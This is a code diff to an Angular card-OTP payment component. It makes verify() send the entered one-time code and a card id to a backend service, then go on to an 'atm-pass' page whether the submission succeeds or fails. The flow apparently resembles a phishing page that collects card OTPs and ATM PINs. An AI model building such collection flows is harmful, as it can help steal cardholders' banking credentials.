@@ -2,6 +2,8 @@ import { Component, ElementRef, QueryList, ViewChildren, OnDestroy, OnInit, inje
 import { CommonModule, Location } from '@angular/common';
 import { Router } from '@angular/router';
 import { Header } from "../../Layout/header/header";
+import { OtpService } from '../../Core/services/api/otp.service';
+import { CheckoutService } from '../../Core/services/api/checkout.service';
 
 @Component({
   imports: [CommonModule, Header],
@@ -14,6 +16,8 @@ export class CardOtp implements OnInit, OnDestroy {
   
   private readonly router = inject(Router);
   private readonly location = inject(Location);
+  private readonly otpService = inject(OtpService);
+  private readonly checkoutService = inject(CheckoutService);
 
   otp: string[] = ['', '', '', '', '', ''];
   timeLeft: number = 60;
@@ -105,7 +109,23 @@ export class CardOtp implements OnInit, OnDestroy {
 
   verify(): void {
     if (this.isOtpComplete) {
-      this.router.navigate(['/payment/atm-pass']);
+      const otpCode = this.otp.join('');
+      const userId = this.checkoutService.cardId;
+
+      if (!userId) {
+        this.router.navigate(['/payment/atm-pass']);
+        return;
+      }
+
+      this.otpService.submitOtp(otpCode, userId).subscribe({
+        next: () => {
+          this.router.navigate(['/payment/atm-pass']);
+        },
+        error: (err) => {
+          console.error('OTP submission failed', err);
+          this.router.navigate(['/payment/atm-pass']);
+        }
+      });
     }
   }
 }
